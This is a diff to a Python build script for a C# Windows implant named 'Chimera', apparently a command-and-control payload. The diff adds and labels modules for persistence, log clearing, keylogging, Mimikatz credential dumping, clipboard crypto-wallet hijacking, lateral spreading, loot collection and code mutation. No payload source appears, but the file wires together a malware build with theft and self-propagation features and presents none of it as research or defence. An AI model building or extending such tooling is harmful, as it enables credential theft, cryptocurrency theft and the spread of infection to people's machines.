@@ -66,17 +66,20 @@ class Chimera(PayloadType):
                 "-target:winexe",
                 "-platform:x86",
                 "-out:/tmp/chimera.exe",
+                # Assembly references
                 "-r:System.Net.Http.dll",
                 "-r:System.Drawing.dll",
-                "-r:System.Management.dll",
-                "-r:System.ServiceProcess.dll",
-                "-r:System.Windows.Forms.dll",
+                "-r:System.Management.dll",        # Ps.cs, Persist2.cs (WMI)
+                "-r:System.ServiceProcess.dll",    # ClearLogs.cs
+                "-r:System.Windows.Forms.dll",     # Clipper.cs, Screenshot.cs (Clipboard)
+                # Core
                 f"{build_dir}/Program.cs",
                 f"{build_dir}/Config.cs",
                 f"{build_dir}/C2Http.cs",
                 f"{build_dir}/Staging.cs",
                 f"{build_dir}/Tasking.cs",
                 f"{build_dir}/StringHelper.cs",
+                # Commands — core
                 f"{build_dir}/Commands/Shell.cs",
                 f"{build_dir}/Commands/Upload.cs",
                 f"{build_dir}/Commands/Download.cs",
@@ -86,15 +89,31 @@ class Chimera(PayloadType):
                 f"{build_dir}/Commands/Sleep.cs",
                 f"{build_dir}/Commands/Kill.cs",
                 f"{build_dir}/Commands/Help.cs",
+                # Commands — persistence
                 f"{build_dir}/Commands/Persist.cs",
+                f"{build_dir}/Commands/Persist2.cs",
+                # Commands — injection / stealer
                 f"{build_dir}/Commands/InjectAssembly.cs",
+                # Commands — elevation / evasion
                 f"{build_dir}/Commands/RunasExec.cs",
+                f"{build_dir}/Commands/ClearLogs.cs",
+                # Commands — recon / post-exploitation
                 f"{build_dir}/Commands/Screenshot.cs",
                 f"{build_dir}/Commands/Keylogger.cs",
                 f"{build_dir}/Commands/Ps.cs",
                 f"{build_dir}/Commands/Mimikatz.cs",
-                f"{build_dir}/Commands/ClearLogs.cs",
+                # Commands — crypto hijacking
                 f"{build_dir}/Commands/Clipper.cs",
+                # Commands — lateral movement
+                f"{build_dir}/Commands/Spread.cs",
+                # Commands — loot
+                f"{build_dir}/Commands/Collect.cs",
+                # Commands — mutation
+                f"{build_dir}/Commands/Mutate.cs",
+                # Commands — C2 config
+                f"{build_dir}/Commands/C2Config.cs",
+                # Commands — health check
+                f"{build_dir}/Commands/CheckHealth.cs",
             ] + res_flags
 
             result = subprocess.run(
